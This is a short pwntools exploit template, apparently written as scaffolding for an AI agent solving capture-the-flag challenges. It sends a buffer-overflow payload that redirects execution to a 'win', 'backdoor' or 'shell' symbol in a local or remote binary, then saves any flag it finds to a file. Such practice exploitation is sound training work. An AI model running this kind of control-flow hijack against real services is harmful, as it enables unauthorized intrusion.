#!/usr/bin/env python3
from pwn import *
import os, re

BIN = os.getenv("BIN", "./chall")
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "0"))
REMOTE = os.getenv("REMOTE", "0") == "1"
OFFSET = int(os.getenv("OFFSET", "0"))  # TODO: set after crash/control proof
FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"

elf = context.binary = ELF(BIN, checksec=False)
context.log_level = os.getenv("LOG", "info")


def start():
    return remote(HOST, PORT) if REMOTE else process(BIN)


def emit(data: bytes):
    print(data.decode(errors="replace"))
    m = re.search(FLAG_RE, data)
    if m:
        flag = m.group(0).decode(errors="replace")
        open("agent_flag.txt", "w", encoding="utf-8").write(flag + "\n")
        log.success(flag)


# TODO: choose exact win-like symbol; do not guess final until reachable.
win = (
    elf.sym.get("win")
    or elf.sym.get("backdoor")
    or elf.sym.get("shell")
    or elf.sym.get("print_flag")
)
if not win:
    raise SystemExit("TODO: set a verified win-like symbol; do not fall back to system without an argument plan")

io = start()
payload = flat({OFFSET: [win]})
io.sendline(payload)
emit(io.recvall(timeout=3))
